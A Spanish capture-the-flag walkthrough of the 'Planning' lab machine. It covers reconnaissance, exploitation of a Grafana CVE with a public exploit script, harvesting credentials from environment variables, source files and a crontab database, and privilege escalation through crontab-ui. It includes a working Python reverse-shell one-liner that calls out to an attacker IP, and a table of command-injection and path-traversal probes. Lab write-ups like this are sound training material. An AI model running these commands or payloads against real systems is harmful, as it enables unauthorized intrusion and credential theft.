
# Planning

<figure><img src="/files/Q03D2TyIQ8psyDLnrWUT" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Pista inicial</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
admin / 0D5oT70Fq13EvB5r
```

***

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Planning`
* **IP:** `10.10.11.68`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `27/05/2025`

***

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.68` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

<figure><img src="/files/i7yQwHwiDrUCEZlLguIu" alt=""><figcaption></figcaption></figure>

Parece una web de cursos online. Tiene algunos formularios como el input del index y la página de Contact que podrían tener alguna vulnerabilidad.

***

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sV -T5 10.10.11.68
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

***

## <mark style="color:purple;">Testing de formularios</mark>

Probamos distintas técnicas de inyección contra los formularios e inputs de la web pero ninguno nos devuelve nada interesante.

***

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch nos encontramos unos pocos directorios:

```bash
dirsearch -u http://planning.htb -x 404


  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/planning/reports/http_planning.htb/_25-05-21_20-10-20.txt

Target: http://planning.htb/

[20:10:20] Starting: 
[20:10:21] 301 -  178B  - /js  ->  http://planning.htb/js/
[20:10:31] 200 -   12KB - /about.php
[20:10:51] 200 -   10KB - /contact.php
[20:10:52] 301 -  178B  - /css  ->  http://planning.htb/css/
[20:11:01] 301 -  178B  - /img  ->  http://planning.htb/img/
[20:11:03] 403 -  564B  - /js/
[20:11:04] 301 -  178B  - /lib  ->  http://planning.htb/lib/
[20:11:04] 403 -  564B  - /lib/

Task Completed
```

Revisando los directorios no encontramos nada relevante.

***

## <mark style="color:purple;">Enumeración de Vhosts</mark>

#### Extraer el Content-Length

```bash
curl -s -I http://10.10.11.68 -H "HOST: defnotvalid.planning.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing de vhosts con ffuf

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host:FUZZ.planning.htb' -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.68/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 37ms]
```

Encontramos un subdominio grafana muy interesante! Vamos a añadirlo a `/etc/hosts` y echarle un ojo.

<figure><img src="/files/BSsZT9WYunkeqidRvdBR" alt=""><figcaption></figcaption></figure>

Llegamos a un panel de login de grafana y encontramos una versión: `11.0.0.` Probando las credenciales proporcionadas para la máquina logramos acceder sin problema.

```
admin / 0D5oT70Fq13EvB5r
```

<figure><img src="/files/OtXWpUI4RZk8IkEIwaib" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Búsqueda de exploits</mark>

En el siguiente post encontramos un CVE asociado con la versión 11.0 de grafana:

{% embed url="<https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/>" %}

En Sploitus encontramos algunos exploits interesantes:

{% embed url="<https://sploitus.com/?query=Grafana#exploits>" %}

Encontramos este exploit interesante:

{% embed url="<https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit>" %}

***

## <mark style="color:purple;">Explotación de Grafana</mark>

Iniciamos un listener de netcat y ejecutamos el exploit:

```bash
python poc.py --url http://grafana.planning.htb:80 --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.15.28 --reverse-port 4444

[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 4444
Failed to trigger reverse shell: 504 <html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.24.0 (Ubuntu)</center>
</body>
</html>
```

<figure><img src="/files/WnZCU68C6kLtpCFkSEfh" alt=""><figcaption></figcaption></figure>

puedes ver que estamos en un entorno Docker y después de buscar cualquier dato importante\
leemos la variable env:

```shell-session
# ls
LICENSE
bin
conf
public

# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/root
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=ls
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```

Encontramos lo que parece la contraseña de un administrador de seguridad de Grafana:

```
enzo / RioTecRANDEntANT!
```

Probamos a acceder en el login de Grafana pero no nos deja, por lo que probaremos estas credenciales por SSH.

***

## <mark style="color:purple;">User flag</mark>

```shell-session
ssh enzo@10.10.11.68

The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

Last login: Tue May 27 10:00:42 2025 from 10.10.15.28

enzo@planning:~$ ls                                                                                                                                                   
user.txt

enzo@planning:~$ cat user.txt .txt
589b3e88e0c9de7e113a5***********
```

***

## <mark style="color:purple;">Escalada de privilegios</mark>

### Permisos de ejecución

No tenemos permisos de ejecución en la máquina:

```shell-session
enzo@planning:/$ sudo -l

Sorry, user enzo may not run sudo on planning.
```

### Puertos abiertos

Usamos `netstat` para verificar los puertos abiertos en el servidor:

```shell-session
enzo@planning:/$ netstat -tulnp

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36099         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -       
```

Encontré que el puerto `3306` y `8000` estaban abierto, con MySQL y HTTP ejecutándose. Verifiqué el archivo de configuración web y encontré el nombre de usuario y la contraseña de MySQL, lo que me permitió iniciar sesión con éxito en MySQL.

{% content-ref url="/pages/zIfv10AYKkDbbaHf34TR" %}
[Credential Hunting - Linux](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/linux-attacks/credential-hunting-linux.md)
{% endcontent-ref %}

```shell-session
enzo@planning:~$ find /var/www -type f \( -name "*.php" -o -name "*.env" -o -name "*.conf" \)

/var/www/web/lib/waypoints/links.php
/var/www/web/course.php
/var/www/web/detail.php
/var/www/web/enroll.php
/var/www/web/index.php
/var/www/web/about.php
/var/www/web/contact.php
```

```bash
enzo@planning:/$ head /var/www/web/index.php

<?php
$servername = "localhost";
$username = "root";
$password = "EXTRapHY"; 
$dbname = "edukate"; 

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
```

### Acceso a la base de datos

```shell-session
enzo@planning:/$ mysql -u root -p

Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 133
Server version: 8.0.41-0ubuntu0.24.04.1 (Ubuntu)
```

```sql
mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| edukate            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use edukate;
Database changed

mysql> SHOW TABLES;
+-------------------+
| Tables_in_edukate |
+-------------------+
| courses           |
| enroll            |
+-------------------+
2 rows in set (0.01 sec)
```

Enumeramos el contenido de las tablas pero no encontramos ninguna credencial válida, más que payloads sospechosos intentando explotar Path Traversal:

```sql
mysql> SELECT * FROM courses;
Empty set (0.00 sec)

mysql> SELECT * FROM enroll; 
+-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+
| id  | full_name                                                                                                                                                                                                                         | email                                                                                                                                                                                                                                         | phone        |
+-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+
|   1 | zzzz                                                                                                                                                                                                                              | zzz@zzz.com                                                                                                                                                                                                                                   | 12345667     |
|   2 | matt                                                                                                                                                                                                                              | matt@matt.com                                                                                                                                                                                                                                 | 01234567     |
|   3 | matt                                                                                                                                                                                                                              | matt@matt.com                                                                                                                                                                                                                                 | 01234567     |
|   4 | 5y4erqxz3fhke7g7ppnvbifz3q9jx9l19twjk8.oastify.com                                                                                                                                                                                | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|   5 | http://rd806ccli1w6ttvt4b2hq4ulico5cv0lodb3zs.oastify.com/?PjctNssP                                                                                                                                                               | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|   6 | PjctNssP                                                                                                                                                                                                                          | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|   7 | nslookup -q=cname 84ahxt329innkamavstyhll29tfm3cr5utmgc41.oastify.com.&                                                                                                                                                           | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|   8 | PjctNssP|nslookup -q=cname h4mqx23b9rnwkjmjv1t7hulb92fv3lrhf92zqo.oastify.com.&                                                                                                                                                   | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|   9 | PjctNssP'"`0&nslookup -q=cname hf0q82ebkrywvjxj6147suwbk2qvel2iqad01p.oastify.com.&`'                                                                                                                                             | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  10 | PjctNssP&nslookup -q=cname nofwh8nhtx724p6pf7dd105ht8z1nrbmzem4at.oastify.com.&'\"`0&nslookup -q=cname nofwh8nhtx724p6pf7dd105ht8z1nrbmzem4at.oastify.com.&`'                                                                     | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  11 | PjctNssP|echo tbur55pavd fj0qiam0dj||a #' |echo tbur55pavd fj0qiam0dj||a #|" |echo tbur55pavd fj0qiam0dj||a #                                                                                                                     | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  12 | PjctNssP&echo 4vi49nm0lv pfq8fclh8p&                                                                                                                                                                                              | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  13 | PjctNssP"|echo 4cw6sbb78d rldym9qdsz ||                                                                                                                                                                                           | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  14 | PjctNssP'|echo 9upibd2l2v pzly827n8l #xzwx                                                                                                                                                                                        | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  15 | PjctNssP|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1                                                                                                  | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  16 | PjctNssP|ping -c 21 127.0.0.1||x                                                                                                                                                                                                  | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  17 | PjctNssP                                                                                                                                                                                                                          | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  18 | PjctNssP&ping -n 21 127.0.0.1&                                                                                                                                                                                                    | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  19 | PjctNssP'|ping -c 21 127.0.0.1 #                                                                                                                                                                                                  | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  20 | PjctNssP"|ping -n 21 127.0.0.1 ||                                                                                                                                                                                                 | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  21 | PjctNssP                                                                                                                                                                                                                          | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  22 | ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini                                                                                                                                                                   | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  23 | c:\windows\win.ini                                                                                                                                                                                                                | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  24 | ../../../../../../../../../../../../../../../../windows/win.ini                                                                                                                                                                   | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  25 | ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini                                                                                                                                                                     | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  26 | ../../../../../../../../../../../../../../../../winnt/win.ini                                                                                                                                                                     | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  27 | \windows\win.ini                                                                                                                                                                                                                  | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  28 | file:///c:/windows/win.ini                                                                                                                                                                                                        | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  29 | ...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini                                                                                                                                                       | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  30 | .../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\windows/win.ini                                                                                                                                                       | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  31 | ...\./...\./...\./...\./...\./...\./...\./...\./...\./...\./windows/win.ini                                                                                                                                                       | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  32 | PjctNssP                                                                                                                                                                                                                          | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  33 | %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini                                                                                                                       | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  34 | PjctNssP..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini                                                                                                                                                           | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  35 | PjctNssP../../../../../../../../../../../../../../../../windows/win.ini                                                                                                                                                           | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  36 | PjctNssP..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini                                                                                                                                                             | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  37 | PjctNssP../../../../../../../../../../../../../../../../winnt/win.ini                                                                                                                                                             | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  38 | ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini PjctNssP                                                                                                                                                          | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  39 | c:\windows\win.ini PjctNssP                                                                                                                                                                                                       | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  40 | ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini PjctNssP                                                                                                                                                            | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  41 | ../../../../../../../../../../../../../../../../etc/passwd                                                                                                                                                                        | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  42 | PjctNssP                                                                                                                                                                                                                          | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  43 | /etc/passwd                                                                                                                                                                                                                       | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  44 | file:///etc/passwd                                                                                                                                                                                                                | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  45 | ..././..././..././..././..././..././..././..././..././..././etc/passwd                                                                                                                                                            | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  46 | %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                                                                                                                            | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  47 | PjctNssP../../../../../../../../../../../../../../../../etc/passwd                                                                                                                                                                | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
|  48 | ../../../../../../../../../../../../../../../../etc/passwd PjctNssP                                                                                                                                                               | vyUqYftS@burpcollaborator.net                                                                                                                                                                                                                 | 551-235-1919 |
<----SNIP---->
```

### Acceso web

Vamos a echarle un ojo al puerto 8000 expuesto:

```
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
```

#### Habilitar Port Forwaring SSH

```bash
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```

#### Acceso web en Kali

<figure><img src="/files/FRpECps6N5Xa3BJEpfR9" alt=""><figcaption></figcaption></figure>

Llegamos a un panel de login web pero se un nombre de usuario y una contraseña para iniciar sesión. Intentamos usar las credenciales que tenemos hasta el momento, pero el inicio de sesión falló.

### Credential Hunting

Recopilé información y encontré un `/opt/crontabs`. Dentro había un archivo `crontab.db`.&#x20;

```shell-session
enzo@planning:~$ find / -type f -iname "*.sqlite" -o -iname "*.db" 2>/dev/null

/var/lib/command-not-found/commands.db
/var/lib/fwupd/pending.db
<----SNIP---->
/usr/lib/firmware/regulatory.db
/usr/lib/node_modules/crontab-ui/crontabs/backup Fri Feb 28 2025 20:27:11 GMT 0000 (Coordinated Universal Time).db
/usr/lib/node_modules/crontab-ui/crontabs/env.db
/usr/lib/node_modules/crontab-ui/crontabs/crontab.db
/usr/lib/node_modules/crontab-ui/crontabs/backup Fri Feb 28 2025 20:33:29 GMT 0000 (Coordinated Universal Time).db
/opt/crontabs/crontab.db
```

Este archivo contiene una **credencial sensible en texto claro** usada para proteger un archivo comprimido:

```shell-session
enzo@planning:~$ cat /opt/crontabs/crontab.db

{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

```
P4ssw0rdS0pRi0T3c
```

### Acceso a Crontabs

Usé el nombre de usuario `root` para iniciar sesión en el sitio web al que acababa de acceder y funciona:

<figure><img src="/files/1eCXxgmuaZFC12xyg3GW" alt=""><figcaption></figcaption></figure>

Agregamos una entrada `crontab` para añadir una reverse shell:

```bash
python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.28',9443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

<figure><img src="/files/0PAZVvuctZjToieQ7Fbb" alt=""><figcaption></figcaption></figure>

Guardamos, abrimos un listener de netcat y pulsamos en el botón "`Save to crontab`" para guardarlo y que se ejecute automáticamente:

<figure><img src="/files/RZmLoUFyzjJZDIsTtHmA" alt=""><figcaption></figcaption></figure>

Recibimos una shell como root:

```shell-session
root@planning:~# whoami
root

root@planning:~# id
uid=0(root) gid=0(root) groups=0(root)

root@planning:~# cd /root
root@planning:~# ls
root.txt
scripts

root@planning:~# cat root.txt   
4b16d9bac759c048a20e**************
```
